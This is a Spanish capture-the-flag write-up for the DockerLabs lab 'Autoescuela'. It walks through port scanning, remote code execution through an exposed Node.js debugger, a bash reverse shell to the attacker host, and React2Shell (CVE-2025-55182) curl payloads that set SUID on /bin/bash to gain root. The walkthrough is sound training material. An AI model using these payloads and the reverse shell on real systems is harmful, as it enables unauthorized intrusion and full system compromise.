@@ -1,0 +1,236 @@
+---
+title: Autoescuela
+description: Resolución completa de la máquina virtual *Autoescuela* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Autoescuela**, desarrollada por *mikisbd* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone el depurador de Node.js en el puerto 9229, accesible públicamente, lo que permite la ejecución remota de comandos a través de la consola del inspector. Tras obtener una reverse shell como el usuario `webuser`, se identifica un servidor interno en `localhost:3000` que ejecuta como `root` y es vulnerable a **CVE-2025-55182** (React2Shell), permitiendo la escalada de privilegios mediante la ejecución de comandos con permisos de administrador.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Autoescuela',
+    Autor: 'mikisbd',
+    Dificultad: 'Fácil',
+    Fecha: '05/04/2026',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Autoescuela.zip
+sudo bash auto_deploy.sh Autoescuela.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Autoescuela/{content,exploits,nmap,scripts}
+cd Autoescuela
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **8080/tcp** — HTTP
+* **9229/tcp** — HTTP (Node.js Debugger)
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1776297140/Ports_uao4ih.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p8080,9229 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web (puerto 8080)
+
+Se realiza un escaneo de directorios en el servicio del puerto 8080:
+
+```bash
+feroxbuster -u "http://172.17.0.2:8080/" \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -t 100 -e js,php,txt,html -C 404
+```
+
+No se encuentran recursos relevantes más allá del `index`, una página de una escuela de manejo.
+
+![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1776297139/Index_ezchql.png)
+
+---
+
+### 1.4 Enumeración web (puerto 9229)
+
+Al acceder al puerto 9229, se observa el mensaje:
+```
+WebSockets request was expected
+```
+
+Investigando, se identifica que este puerto corresponde al **depurador de Node.js**. Se accede al endpoint `/json` para confirmar:
+
+```bash
+curl http://172.17.0.2:9229/json
+```
+
+![JSON Node Debugger](https://res.cloudinary.com/dewqswzke/image/upload/v1776297139/Json_dpoxsa.png)
+
+Esto confirma que el inspector de Node.js es accesible de forma remota.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Conexión al depurador de Node.js
+
+Se abre `chrome://inspect` en un navegador basado en Chromium, se configura la dirección `172.17.0.2:9229` y se accede al objetivo remoto.
+
+![Recon DevTools](https://res.cloudinary.com/dewqswzke/image/upload/v1776297140/ReconDev_saqd6i.png)
+
+### 2.2 Ejecución remota de comandos
+
+Se crea una función para ejecutar comandos del sistema:
+
+```js
+function run(cmd) {
+  const { execSync } = require('child_process');
+  return execSync(cmd).toString();
+}
+```
+
+Se prueba con `run('id');`:
+
+![ID result in DevTools](https://res.cloudinary.com/dewqswzke/image/upload/v1776297138/IdWeb_lr5q9i.png)
+
+### 2.3 Reverse Shell
+
+Se inicia un listener en la máquina atacante:
+
+```bash
+nc -nlvp 443
+```
+
+En DevTools se ejecuta:
+
+```js
+run('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"');
+```
+
+![Reverse Shell](https://res.cloudinary.com/dewqswzke/image/upload/v1776297141/ReverseShell_qip67i.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De webuser → root
+
+Se realiza una enumeración del sistema y se identifica el archivo `entrypoint.sh`:
+
+![Entrypoint](https://res.cloudinary.com/dewqswzke/image/upload/v1776297138/Entrypoint_khyzgo.png)
+
+El archivo revela información clave:
+- Hay un servidor interno en `localhost:3000` ejecutándose como `root`.
+- Dicho servidor es vulnerable a **CVE-2025-55182** (React2Shell).
+
+Se comprueba la vulnerabilidad con `curl`:
+
+```bash
+curl -X POST http://127.0.0.1:3000 \
+  -H "Next-Action: x" \
+  -F '0={"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\": \"$B0\"}","_response":{"_prefix":"var res = process.mainModule.require('\''child_process'\'').execSync('\''id'\'',{'\''timeout'\'':5000}).toString().trim(); throw Object.assign(new Error('\''NEXT_REDIRECT'\''), {digest:`${res}`});","_formData":{"get":"$1:constructor:constructor"}}}' \
+  -F '1="$@0"'
+```
+
+![Result React2Shell](https://res.cloudinary.com/dewqswzke/image/upload/v1776297140/ResultReact2Shell_mqbtvk.png)
+
+Se establece el bit SUID en `/bin/bash`:
+
+```bash
+curl -X POST http://127.0.0.1:3000 \
+  -H "Next-Action: x" \
+  -F '0={"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\": \"$B0\"}","_response":{"_prefix":"process.mainModule.require('\''child_process'\'').execSync('\''chmod u+s /bin/bash'\'');","_formData":{"get":"$1:constructor:constructor"}}}' \
+  -F '1="$@0"'
+```
+
+Se ejecuta `bash -p` para obtener una shell con privilegios de root:
+
+```bash
+bash -p
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1776297141/Root_wbxo0j.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Exposición del depurador de Node.js en puerto 9229",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como webuser"
+    },
+    {
+      vulnerability: "Servicio interno vulnerable a CVE-2025-55182 (React2Shell)",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Información sensible en entrypoint.sh",
+      severity: "Media",
+      impact: "Revelación de vectores de escalada de privilegios"
+    },
+    {
+      vulnerability: "Servidor interno ejecutándose como root sin necesidad",
+      severity: "Alta",
+      impact: "Compromiso total del sistema al explotar vulnerabilidad"
+    },
+    {
+      vulnerability: "Falta de autenticación en el depurador de Node.js",
+      severity: "Crítica",
+      impact: "Acceso no autorizado a la consola remota"
+    }
+  ]}
+/>
